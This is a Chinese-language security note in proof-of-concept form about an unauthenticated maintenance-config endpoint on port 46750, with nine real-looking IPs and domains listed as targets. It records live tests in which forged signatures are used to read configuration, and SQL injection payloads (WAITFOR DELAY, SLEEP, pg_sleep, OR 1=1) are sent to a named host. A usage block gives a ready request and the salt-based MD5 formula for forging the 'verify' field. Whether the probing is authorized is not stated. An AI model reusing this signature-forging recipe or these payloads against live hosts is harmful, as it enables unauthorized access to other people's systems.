# 46750 GetMaintenance 4 字段未授权配置面无法升级：channel 仅二元开关、userid/version 被忽略、无注入/凭据/写原语

- **code**: 46750-getmaintenance-4-字段未授权配置面无法升级-channel-仅二元开关-userid-ver
- **kind**: poc
- **category**: info-leak
- **component**: 自研 App 业务网关 /maintenance（GetMaintenance 4 字段：version/userid/channel/verify，盐 private_maintenance）
- **severity**: medium
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-05 对 47.100.166.127:46750 实测：vip_1 → 200/3469B/7E24C11C45283013；vip_2/vip_3/dev/test/prod/105001/0 → 200/3059B/1AFD6D86291D5EFD（同 servers，仅少 agents/wxservice）；userid 0/1/10000/643700/224282/485982/-1 全部同 3469B 基线；channel="vip_1';WAITFOR DELAY '0:0:5'-- -" 等 5 种注入载荷全部 3059B/0.13s 无时延；userid="0 OR 1=1" → 39B {"ret":1,"msg":"参数检查失败！"}。
- **tags**: 46750,maintenance,GetMaintenance,private_maintenance,negative,info-disclosure,no-sqli,no-rce
- **created_at**: 2026-11-04T20:08:33.506Z
- **engine**: 47.100.166.127:46750 / 43.139.167.210:46750 / 34.92.112.63:46750 / 23.224.93.244:46750 / cbob.evuzp9.com:46750 / 110.41.227.204:46750 / nazu.klwfqk.com:46750 / uips.pmcqef.com:46750 / 1fy6.h34zsd.cc:443
- **found_by**: exploit

## 描述

负面情报：该未授权配置下发接口虽可用客户端静态盐离线伪造 verify，但利用上限就是读取运营配置本身。实测 20+ 发只读请求证明：channel 只区分「精确 vip_1（3469B，多 agents/wxservice）」与「其它任意值（3059B，同 accessurl/servers）」，不存在多环境/多租户分发；userid 与 version 被服务端完全忽略；按注入值重算 verify 后，MySQL SLEEP/MSSQL WAITFOR/PG pg_sleep/引号/OR 1=1 均 0.13s 同型无时延无报错，userid 非数字被强类型绑定 39B ret=1 拒绝。配置内容无 token/口令/密钥。不要在该接口上继续找 RCE/注入/越权写。

## 用法

```
判定步骤：POST https://<46750 host>/maintenance，Content-Type: application/json;charset=utf-8，浏览器 UA，body {"version":"0.0.0.0","userid":0,"channel":"vip_1","verify":"9A0BEE24A692E5B5E3EE3C12F69EBCDA"}。基线应为 200/3469B/ret=0/sha16=7E24C11C45283013；若改变 channel 得 3059B/1AFD6D86291D5EFD 即证明只是二元开关。进一步注入测试必须按注入后的字符串重算 verify（"channel"+ch+"userid"+uid+"version"+ver+"private_maintenance" 的 MD5 大写），否则只会得到 ret=1 的假阴性。
```
